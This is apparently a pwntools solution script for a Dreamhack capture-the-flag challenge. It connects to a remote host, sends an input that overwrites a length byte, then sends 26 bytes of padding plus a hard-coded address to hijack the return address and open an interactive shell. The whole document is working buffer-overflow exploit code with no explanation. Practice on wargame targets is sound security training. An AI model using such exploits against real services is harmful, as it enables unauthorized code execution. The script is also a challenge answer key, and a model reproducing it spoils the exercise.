from pwn import *

HOST = "host3.dreamhack.games"
PORT = 8429
conn = remote(HOST, PORT)
# conn = process("./chall")

conn.sendlineafter(b'Menu: ', b'cherry' + b'A' * 6 + b'\x22')
conn.sendlineafter(b'Is it cherry?: ', b'A' * 26 + b'\xbc\x12\x40\x00\x00\x00\x00\x00')
conn.interactive()